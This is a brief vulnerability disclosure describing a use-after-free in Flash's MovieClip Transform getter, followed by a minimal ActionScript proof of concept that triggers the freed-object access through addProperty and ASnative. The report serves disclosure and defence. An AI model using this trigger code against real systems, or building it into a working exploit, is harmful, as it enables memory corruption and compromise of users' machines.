 
There is a use-after-free in the MovieClip Transform getter. If the Transform constructor is replaced with a getter using addProperty, this getter can free the MovieClip before it is accessed. A minimal PoC is as follows:
 
var mc = this.createEmptyMovieClip( "mc", 1);
var tf = flash.geom.Transform;
var g = flash.geom;
g.addProperty("Transform", func, func);
mc.f = ASnative(900, 419);
mc.f();
 
function func(){
     
    mc.removeMovieClip();
     
        // Fix heap
    }
